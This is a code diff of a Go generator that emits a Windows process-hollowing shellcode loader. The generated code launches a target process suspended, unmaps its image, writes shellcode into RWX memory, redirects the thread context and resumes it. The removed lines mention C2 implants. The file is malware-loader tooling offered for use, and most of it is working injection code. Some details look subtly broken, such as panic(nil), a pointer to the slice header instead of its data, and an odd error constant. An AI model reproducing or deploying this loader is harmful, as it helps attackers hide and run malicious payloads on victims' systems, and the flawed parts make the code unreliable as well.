@@ -5,15 +5,8 @@ import (
 )
 
 /*
-    1. create Process in suspended state
-    2. create new section in suspended process, length of which is our shellcode
-    3. copy shellcode to section
-    4. map out new section using NtMapViewOfSection
-    5. unmap the section immediately
-    6. NtQueueApcThread
-    7. set thread information
-    8. resume Thread, enjoy life
-
+   adapted from go-runpe:
+   https://github.com/abdullah2993/go-runpe
 
    For more information, feel free to read this:
    https://www.blackhat.com/docs/asia-17/materials/asia-17-KA-What-Malware-Authors-Don't-Want-You-To-Know-Evasive-Hollow-Process-Injection-wp.pdf
@@ -21,50 +14,52 @@ import (
 
 func GetProcessHollowingTemplate(targetProcess string) string {
 
-	println("[!] Please be aware this is still a work in progress and unstable.")
-	println("Maybe you could use another technique instead...? I hear the CreateThread one is pretty good...\n")
+	println("\n[!] Please be aware ProcessHollowing implementation is still a work in progress and unstable.")
+	println("Maybe you could use another technique instead...? I hear the CRT one is pretty good...\n")
 
 	return fmt.Sprintf(`
-    package main
+package main
 
 import (
-	"os"
+    "os/exec"
+    "path/filepath"
+	"bytes"
+	"debug/pe"
+	"encoding/binary"
+	"io/ioutil"
 	"syscall"
 	"unsafe"
 )
 
-const (
-	MEM_COMMIT             = 0x1000
-	MEM_RESERVE            = 0x2000
-	PAGE_EXECUTE_READWRITE = 0x40
 
-    SEC_COMMIT          = 0x08000000
-    SECTION_ALL_ACCESS  = 0x000F001F
-    CREATE_SUSPENDED    = 0x00000004
-    DETACHED_PROCESS    = 0x00000008
-    CREATE_NO_WINDOW    = 0x08000000
+const (
+    CREATE_SUSPENDED          = 0x00000004
+    CREATE_NO_WINDOW          = 0x08000000
+
+    MEM_COMMIT                = 0x00001000
+    MEM_RESERVE               = 0x00002000
+    PAGE_EXECUTE_READWRITE    = 0x00000040
 )
 
 var (
-	kernel32 = syscall.MustLoadDLL("kernel32.dll")
-	ntdll    = syscall.MustLoadDLL("ntdll.dll")
+	modkernel32         = syscall.MustLoadDLL("kernel32.dll")
+	WriteProcessMemory  = modkernel32.MustFindProc("WriteProcessMemory")
+	ReadProcessMemory   = modkernel32.MustFindProc("ReadProcessMemory")
+	VirtualAllocEx      = modkernel32.MustFindProc("VirtualAllocEx")
+	GetThreadContext    = modkernel32.MustFindProc("GetThreadContext")
+	SetThreadContext    = modkernel32.MustFindProc("SetThreadContext")
+	ResumeThread        = modkernel32.MustFindProc("ResumeThread")
 
-    zwCreateSection = ntdll.MustFindProc("ZwCreateSection")
-
-	virtualAlloc = kernel32.MustFindProc("VirtualAlloc")
-	rtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
-	createThread  = kernel32.MustFindProc("CreateThread")
-    createProcess = kernel32.MustFindProc("CreateProcess")
-    resumeThread = kernel32.MustFindProc("ResumeThread")
+	modntdll                = syscall.MustLoadDLL("ntdll.dll")
+	NtUnmapViewOfSection    = modntdll.MustFindProc("NtUnmapViewOfSection")
 )
 
-func loadProcess(target string) *syscall.ProcessInformation {
+
+func createProcess(processName string) *syscall.ProcessInformation {
     var si syscall.StartupInfo
 	var pi syscall.ProcessInformation
 
-	commandLine, err := syscall.UTF16PtrFromString(target)
-
-	if err != nil {
+	commandLine, err := syscall.UTF16PtrFromString(processName); if err != nil {
 		panic(err)
 	}
 
@@ -78,23 +73,154 @@ func loadProcess(target string) *syscall.ProcessInformation {
 		nil,
 		nil,
 		&si,
-		&pi)
-
-	if err != nil {
+		&pi,
+    ); if err != nil {
 		panic(err)
 	}
-
-    println("[+] Created process in suspended state")
 
 	return &pi
 }
 
-func ExecuteOrderSixtySix(payload []byte) {
-    process := loadProcess("%s")
+func readProcessAddr(hProcess uintptr, addr uintptr) (result uintptr, e error) {
+    size := 8
+
+    var numBytesRead uintptr
+    data := make([]byte, size)
+
+	r, _, err := ReadProcessMemory.Call(
+        hProcess,
+		addr,
+		uintptr(unsafe.Pointer(&data[0])),
+		uintptr(size),
+		uintptr(unsafe.Pointer(&numBytesRead)),
+    )
+	if r == 0 {
+		e = err
+        return
+	}
+
+	result = uintptr(binary.LittleEndian.Uint64(data))
+    return
+}
+
+func findProgramPath(filename string) (string, error) {
+    fname, err := exec.LookPath(filename); if err != nil {
+        return "", err
+    }
+    return filepath.Abs(fname)
+}
 
 
-    /* block, so that process does not die (useful for C2 implants) */
-    select {}
+func ExecuteOrderSixtySix(shellcode []byte) {
+    // target process
+    processName := "%s"
+    process := createProcess(processName)
+
+    println("process created")
+
+    // process & thread handles
+    hProcess := uintptr(process.Process)
+    hThread := uintptr(process.Thread)
+
+    // get thread context
+    ctx := make([]uint8, 0x1000)
+    binary.LittleEndian.PutUint32(ctx[48:], 0x00100000|0x00000002)
+    ctxPtr := unsafe.Pointer(&ctx[0])
+
+    r, _, err := GetThreadContext.Call(hThread, uintptr(ctxPtr)); if r == 0 {
+        panic(err)
+    }
+
+    println("received thread context")
+
+    /*
+        https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
+        https://bytepointer.com/resources/tebpeb64.htm
+    */
+    remoteRdx := binary.LittleEndian.Uint64(ctx[136:])
+    imageBaseAddr, err := readProcessAddr(hProcess, uintptr(remoteRdx + 16)); if err != nil {
+        panic(nil)
+    }
+
+    programPath, err := findProgramPath(processName); if err != nil {
+        panic(err)
+    }
+
+    destPE, err := ioutil.ReadFile(programPath); if err != nil {
+		panic(err)
+	}
+
+	destPEReader := bytes.NewReader(destPE)
+	f, err := pe.NewFile(destPEReader); if err != nil {
+        panic(err)
+    }
+
+    oh, ok := f.OptionalHeader.(*pe.OptionalHeader64); if !ok {
+		panic("OptionalHeader64 not found")
+	}
+
+    /* unmapping image from process */
+    r, _, err = NtUnmapViewOfSection.Call(
+        hProcess,
+        imageBaseAddr,
+    ); if r != 0 {
+        panic(err)
+    }
+
+    /* allocating data */
+    newBaseImage, _, err := VirtualAllocEx.Call(
+        hProcess,
+        imageBaseAddr,
+        uintptr(len(shellcode)),
+        uintptr(MEM_COMMIT | MEM_RESERVE),
+        uintptr(PAGE_EXECUTE_READWRITE),
+    ); if newBaseImage == 0 {
+        panic(err)
+    }
+
+    /* writing program to memory */
+    var numBytesRead uintptr
+    r, _, err = WriteProcessMemory.Call(
+        hProcess,
+        newBaseImage,
+        uintptr(unsafe.Pointer(&shellcode[0])),
+        uintptr(len(shellcode)),
+        uintptr(unsafe.Pointer(&numBytesRead)),
+    ); if r == 0 {
+        panic(err)
+    }
+
+    /* writing new image base to rdx */
+    addr := make([]byte, 8)
+	binary.LittleEndian.PutUint64(addr, uint64(newBaseImage))
+	r, _, err = WriteProcessMemory.Call(
+        hProcess,
+        uintptr(remoteRdx + 16),
+        uintptr(unsafe.Pointer(&addr)),
+        uintptr(8),
+        uintptr(unsafe.Pointer(&numBytesRead)),
+    ); if r == 0 {
+		panic(err)
+	}
+
+    /* setting thread context again ! */
+    binary.LittleEndian.PutUint64(
+        ctx[128:],
+        uint64(newBaseImage) + uint64(oh.AddressOfEntryPoint),
+    )
+    r, _, err = SetThreadContext.Call(
+        hThread,
+        uintptr(unsafe.Pointer(&ctx[0])),
+    ); if r == 0 {
+        panic(err)
+    }
+
+    /* Resuming thread and execute payload */
+    r, _, err = ResumeThread.Call(
+        hThread,
+    ); if r == 0xfffffff {
+        panic(err)
+    }
 }
     `, targetProcess)
 }
